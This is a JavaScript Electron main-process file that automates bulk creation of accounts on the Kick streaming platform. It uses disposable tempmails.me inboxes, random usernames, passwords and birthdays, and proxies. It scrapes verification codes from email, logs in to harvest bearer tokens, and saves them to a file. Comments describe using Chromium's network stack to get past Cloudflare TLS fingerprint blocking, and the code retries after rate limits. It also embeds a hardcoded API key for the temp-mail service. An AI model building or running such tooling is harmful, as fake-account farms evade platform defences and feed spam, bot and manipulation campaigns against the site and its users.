// ── IPC: push arbitrary event to renderer (used by kikLog streaming) ─────────
ipcMain.handle('kik-event-push', async (_e, payload) => {
  try {
    if (mainWin && !mainWin.isDestroyed()) mainWin.webContents.send('kik-event', payload);
    return { ok: true };
  } catch (_) { return { ok: false }; }
});


/* ══════════════════════════════════════════════════════════════════════════
 *  KICK CREATE ACCOUNT — Pure HTTP API (no browser, no BrowserView)
 *  All requests made via kikNetFetch (Node.js native https + proxy tunnel).
 *  Flow: CSRF grab → signup API → poll 1secmail → verify email → login.
 * ══════════════════════════════════════════════════════════════════════════ */

const KCA = { running: false, abort: false };

function kcaEmit(data) {
  try {
    if (mainWin && !mainWin.isDestroyed()) mainWin.webContents.send('kick-create-progress', data);
  } catch (_) {}
}
function kcaLog(msg, type) { kcaEmit({ step: 'log', msg, type: type || 'info' }); }

// ── Proxy-test IPC ─────────────────────────────────────────────────────────
ipcMain.handle('kick-proxy-test', async (_e, { proxy }) => {
  try {
    const r = await kikNetFetch('https://httpbin.org/ip', { method: 'GET' }, proxy || null, 10000);
    if (r.ok || r.status === 200) {
      let ip = '';
      try { ip = JSON.parse(r.body).origin || ''; } catch (_) {}
      return { ok: true, ip };
    }
    return { ok: false, error: 'HTTP ' + r.status };
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
});

// ── Stop IPC ───────────────────────────────────────────────────────────────
ipcMain.handle('kick-create-inapp-stop', async () => {
  KCA.abort = true;
  KCA.running = false;
  return { ok: true };
});

// ── Cookie jar helper ──────────────────────────────────────────────────────
// Tracks Set-Cookie across requests so we can maintain a session cookie string.
function parseCookies(setCookieHeader) {
  const jar = {};
  const lines = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader || ''];
  for (const line of lines) {
    const part = String(line || '').split(';')[0].trim();
    const eq = part.indexOf('=');
    if (eq > 0) jar[part.slice(0, eq).trim()] = part.slice(eq + 1).trim();
  }
  return jar;
}
function mergeCookies(a, b) { return Object.assign({}, a, b); }
function jarToString(jar) { return Object.entries(jar).map(([k, v]) => k + '=' + v).join('; '); }

// ── Electron net fetch — uses Chromium network stack (bypasses TLS fingerprint blocks) ──
// Used for direct (no-proxy) requests to Cloudflare-protected sites.
function electronNetFetch(url, opts, timeoutMs) {
  return new Promise((resolve, reject) => {
    const { net } = require('electron');
    const method  = (opts && opts.method)  || 'GET';
    const headers = (opts && opts.headers) || {};
    const bodyStr = (opts && opts.body)    ? String(opts.body) : null;
    const ms      = timeoutMs || 20000;

    let req;
    const timer = setTimeout(() => {
      try { if (req) req.abort(); } catch (_) {}
      reject(new Error('Request timeout'));
    }, ms);

    try {
      req = net.request({ url, method });
    } catch (e) {
      clearTimeout(timer);
      return reject(e);
    }

    Object.entries(headers).forEach(([k, v]) => { try { req.setHeader(k, String(v)); } catch (_) {} });

    let data = '';
    req.on('response', (response) => {
      const resHeaders = {};
      // Flatten header arrays to strings for Set-Cookie compatibility
      Object.entries(response.headers || {}).forEach(([k, v]) => {
        resHeaders[k.toLowerCase()] = Array.isArray(v) ? v : [v];
      });
      response.on('data',  (chunk) => { data += chunk.toString(); });
      response.on('end',   ()      => {
        clearTimeout(timer);
        const status = response.statusCode || 0;
        resolve({ ok: status >= 200 && status < 300, status, headers: resHeaders, body: data });
      });
      response.on('error', (e) => { clearTimeout(timer); reject(e); });
    });
    req.on('error',    (e) => { clearTimeout(timer); reject(e); });

    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// ── Core Kick API helper — uses Chromium stack direct, proxy tunnel via kikNetFetch ──
async function kickReq(method, path, body, jar, proxy, extraHeaders) {
  const url = path.startsWith('http') ? path : 'https://kick.com' + path;
  const xsrf = (jar && jar['XSRF-TOKEN']) ? decodeURIComponent(jar['XSRF-TOKEN']) : '';
  const headers = Object.assign({
    'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Accept':           'application/json, text/plain, */*',
    'Accept-Language':  'en-US,en;q=0.9',
    'Origin':           'https://kick.com',
    'Referer':          'https://kick.com/',
    'X-Requested-With': 'XMLHttpRequest',
  }, extraHeaders || {});
  if (jar && Object.keys(jar).length) headers['Cookie'] = jarToString(jar);
  if (xsrf) headers['X-XSRF-TOKEN'] = xsrf;
  if (body) headers['Content-Type'] = 'application/json';

  const reqOpts = { method, headers, body: body ? JSON.stringify(body) : undefined };

  // Use Chromium stack for direct requests (avoids Cloudflare TLS fingerprint block).
  // Use Node.js proxy tunnel when a proxy is specified.
  const r = proxy
    ? await kikNetFetch(url, reqOpts, proxy, 25000)
    : await electronNetFetch(url, reqOpts, 25000);

  // Merge returned Set-Cookie headers into jar
  const setCookie = r.headers && (r.headers['set-cookie'] || r.headers['Set-Cookie']);
  const newCookies = parseCookies(Array.isArray(setCookie) ? setCookie : [setCookie]);
  const updatedJar = mergeCookies(jar || {}, newCookies);
  return { status: r.status, ok: r.ok, body: r.body, jar: updatedJar };
}

// ── tempmails.me API (replaces 1secmail) ──────────────────────────────────
const TMAILS_KEY    = 'vm_2cb7522806fd603ee245cc063a293b4c46adf0d14c8fa3d00270be65b0f419da';
const TMAILS_DOMAIN = 'diren.tech';

async function tempMailsReq(action, params) {
  const qs = new URLSearchParams(Object.assign({ action, api_key: TMAILS_KEY }, params || {})).toString();
  // Always use Chromium stack — tempmails.me is behind Cloudflare
  const r  = await electronNetFetch('https://tempmails.me/api.php?' + qs, {
    method: 'GET',
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json' },
  }, 15000);
  if (r.status >= 400) throw new Error('tempmails HTTP ' + r.status);
  let j;
  try { j = JSON.parse(r.body); } catch (_) { throw new Error('tempmails bad JSON: ' + String(r.body).slice(0, 80)); }
  if (!j.success) throw new Error('tempmails API error: ' + (j.error || JSON.stringify(j).slice(0, 80)));
  return j;
}

async function tempMailsGenInbox() {
  const j = await tempMailsReq('generate', { domain: TMAILS_DOMAIN });
  const email = String(j.email || '');
  if (!email.includes('@')) throw new Error('tempmails returned invalid email: ' + email);
  const at = email.indexOf('@');
  return { email, login: email.slice(0, at), domain: email.slice(at + 1) };
}

async function tempMailsListMessages(email) {
  const j = await tempMailsReq('inbox', { email });
  return Array.isArray(j.messages) ? j.messages : [];
}

async function tempMailsReadMessage(email, id) {
  const j = await tempMailsReq('message', { email, id: String(id) });
  return j.message || {};
}

// ── Single account creation — pure HTTP ───────────────────────────────────
async function kcaCreateOneAPI(proxy) {
  const mailInfo  = await tempMailsGenInbox();
  const bday      = kacRandomBirthday();
  const password  = kacRandomPassword();
  let   username  = kacRandomKickUsername();

  kcaLog('Email: ' + mailInfo.email + (proxy ? '  [proxy]' : ''), 'info');
  kcaLog('User: ' + username + '  Pass: ' + password, 'dim');

  // ── Step 1: Grab CSRF token ────────────────────────────────────────────
  kcaLog('Fetching CSRF token…', 'dim');
  let jar = {};
  try {
    const homeRes = await kickReq('GET', '/', null, {}, proxy);
    jar = homeRes.jar;
    if (jar['XSRF-TOKEN']) {
      kcaLog('CSRF token OK', 'ok');
    } else {
      kcaLog('CSRF token not found in cookies — proceeding anyway', 'warn');
    }
  } catch (e) {
    kcaLog('CSRF fetch error: ' + e.message, 'warn');
  }

  // ── Step 2: Register ────────────────────────────────────────────────────
  kcaLog('Registering account…', 'dim');
  let signupOk = false;
  for (let attempt = 0; attempt < 3; attempt++) {
    if (KCA.abort) throw new Error('Stopped');
    try {
      const regRes = await kickReq('POST', '/api/v1/signup', {
        email:            mailInfo.email,
        password,
        username,
        name:             username,
        birthday:         bday.iso,
        isMobileNumberVerified: false,
        agreed_to_terms:  true,
      }, jar, proxy);
      jar = regRes.jar;

      let j = {};
      try { j = JSON.parse(regRes.body); } catch (_) {}

      if (regRes.status === 200 || regRes.status === 201 || j.token || j.access_token || j.message === 'success') {
        signupOk = true;
        if (j.token || j.access_token) {
          const token = String(j.token || j.access_token || '').replace(/^Bearer\s+/i, '');
          kcaLog('Account created + token received in signup response ✓', 'ok');
          return { email: mailInfo.email, username, password, birthday: bday.usa, token, ok: true };
        }
        kcaLog('Signup accepted (HTTP ' + regRes.status + ')', 'ok');
        break;
      } else if (regRes.status === 422) {
        // Likely username taken — try a new one
        const errBody = typeof j === 'object' ? JSON.stringify(j).toLowerCase() : String(regRes.body).toLowerCase();
        if (errBody.includes('username') || errBody.includes('taken')) {
          username = kacRandomKickUsername();
          kcaLog('Username taken — retrying with: ' + username, 'warn');
          continue;
        }
        // Other validation error
        kcaLog('Validation error (422): ' + String(regRes.body).slice(0, 200), 'warn');
        signupOk = true; // might have still created the account
        break;
      } else if (regRes.status === 429) {
        kcaLog('Rate limited (429) — waiting 10s…', 'warn');
        await kacSleep(10000);
        continue;
      } else {
        kcaLog('Signup HTTP ' + regRes.status + ': ' + String(regRes.body).slice(0, 200), 'warn');
        signupOk = true; // attempt recorded
        break;
      }
    } catch (e) {
      if (e.message === 'Stopped') throw e;
      kcaLog('Signup request error: ' + e.message, 'warn');
      break;
    }
  }

  // ── Step 3: Poll tempmails.me inbox for verification code / link ─────────
  kcaLog('Polling inbox for verification email…', 'dim');
  let verifyCode = null;
  let verifyLink = null;
  const pollDeadline = Date.now() + 90000;
  while (Date.now() < pollDeadline && !KCA.abort) {
    await kacSleep(5000);
    try {
      const msgs = await tempMailsListMessages(mailInfo.email);
      if (msgs && msgs.length > 0) {
        // Find a Kick-related message
        const kickMsg = msgs.find(m => {
          const subj = String((m.subject || m.title || '')).toLowerCase();
          const from = String((m.from || m.sender || '')).toLowerCase();
          return subj.includes('kick') || subj.includes('verif') || subj.includes('confirm') || from.includes('kick');
        }) || msgs[0];
        const raw = await tempMailsReadMessage(mailInfo.email, kickMsg.id);
        const body = String(raw.body || raw.html || raw.text || '');
        const mCode = body.match(/\b(\d{5,8})\b/) || body.match(/code[:\s]+(\w{5,10})/i);
        if (mCode) { verifyCode = mCode[1]; break; }
        const mLink = body.match(/https?:\/\/[^\s"'<>]*kick\.com[^\s"'<>]*(verif|confirm|activate)[^\s"'<>]*/i);
        if (mLink) { verifyLink = mLink[0]; break; }
      }
    } catch (e) { kcaLog('Inbox poll error: ' + e.message, 'warn'); }
  }

  // ── Step 4a: Click verify link ──────────────────────────────────────────
  if (verifyLink) {
    kcaLog('Verify link found — clicking…', 'dim');
    try {
      const vRes = await kickReq('GET', verifyLink, null, jar, proxy);
      jar = vRes.jar;
      kcaLog('Email verified via link ✓', 'ok');
    } catch (_) { kcaLog('Verify link click failed (continuing)', 'warn'); }
  }
  // ── Step 4b: Submit code via API ────────────────────────────────────────
  else if (verifyCode) {
    kcaLog('Verification code: ' + verifyCode + ' — submitting…', 'dim');
    try {
      const vRes = await kickReq('POST', '/api/v1/email/verify', { code: verifyCode }, jar, proxy);
      jar = vRes.jar;
      let jv = {}; try { jv = JSON.parse(vRes.body); } catch (_) {}
      if (vRes.status < 300 || jv.verified || jv.success || jv.token) {
        kcaLog('Email verified via code ✓', 'ok');
        if (jv.token || jv.access_token) {
          const token = String(jv.token || jv.access_token || '').replace(/^Bearer\s+/i, '');
          kcaLog('Token from verify response ✓', 'ok');
          return { email: mailInfo.email, username, password, birthday: bday.usa, token, ok: true };
        }
      } else {
        kcaLog('Verify API HTTP ' + vRes.status, 'warn');
        // Try alternate endpoint
        try {
          const vRes2 = await kickReq('POST', '/api/v1/verify-email', { code: verifyCode, email: mailInfo.email }, jar, proxy);
          jar = vRes2.jar;
          kcaLog('Alternate verify: HTTP ' + vRes2.status, 'dim');
        } catch (_) {}
      }
    } catch (e) { kcaLog('Verify error: ' + e.message, 'warn'); }
  } else {
    kcaLog('No verification email received within 90s — attempting login anyway', 'warn');
  }

  // ── Step 5: Login to get bearer token ──────────────────────────────────
  kcaLog('Logging in to retrieve token…', 'dim');
  let token = '';
  try {
    const loginRes = await kickReq('POST', '/api/v1/login', {
      email: mailInfo.email,
      password,
    }, jar, proxy);
    jar = loginRes.jar;
    let jl = {}; try { jl = JSON.parse(loginRes.body); } catch (_) {}
    token = String(jl.token || jl.access_token || jl.data?.token || '').replace(/^Bearer\s+/i, '');
    // Also check cookie-based token
    if (!token && jar['kick_session']) token = jar['kick_session'];
    if (token) kcaLog('Token retrieved via login ✓', 'ok');
    else kcaLog('Login HTTP ' + loginRes.status + ' — no token in response', 'warn');
  } catch (e) {
    kcaLog('Login error: ' + e.message, 'warn');
  }

  return { email: mailInfo.email, username, password, birthday: bday.usa, token, ok: !!signupOk };
}

// ── Main IPC handler ───────────────────────────────────────────────────────
ipcMain.handle('kick-create-inapp', async (_e, opts) => {
  if (KCA.running) return { ok: false, error: 'Already running' };
  KCA.running = true;
  KCA.abort   = false;

  const total   = Math.max(1, Math.min(50, parseInt((opts && opts.count) || 1)));
  const delayMs = Math.max(0, parseInt((opts && opts.delay) || 5)) * 1000;
  const proxy   = (opts && opts.proxy) || null;
  const autoAdd = opts && opts.autoAdd !== false;
  const created = [];
  let   failed  = 0;

  kcaEmit({ step: 'start', total });

  for (let i = 0; i < total; i++) {
    if (KCA.abort) { kcaLog('Stopped.', 'warn'); break; }
    kcaEmit({ step: 'progress', done: i, total });
    kcaLog('── Account ' + (i+1) + ' / ' + total + ' ──', 'head');

    try {
      const acc = await kcaCreateOneAPI(proxy);
      created.push(acc);
      if (acc.token) kacAppendFile(acc.email, acc.password, acc.token);
      kcaEmit({ step: 'account', account: acc, done: i+1, total, created: created.length, failed, autoAdd });
      kcaLog('✓ ' + acc.username + ' / ' + acc.email + (acc.token ? ' [token OK]' : ' [no token]'), 'ok');
    } catch (e) {
      if (e.message === 'Stopped') { kcaLog('Stopped.', 'warn'); break; }
      failed++;
      kcaLog('✗ Failed: ' + e.message, 'error');
      kcaEmit({ step: 'failed', done: i+1, total, created: created.length, failed });
    }

    if (i < total - 1 && !KCA.abort) await kacSleep(delayMs);
  }

  kcaEmit({ step: 'done', total, created: created.length, failed });
  kcaLog('Done. Created: ' + created.length + '  Failed: ' + failed, 'info');
  KCA.running = false;
  KCA.abort   = false;
  return { ok: true, created, failed };
});
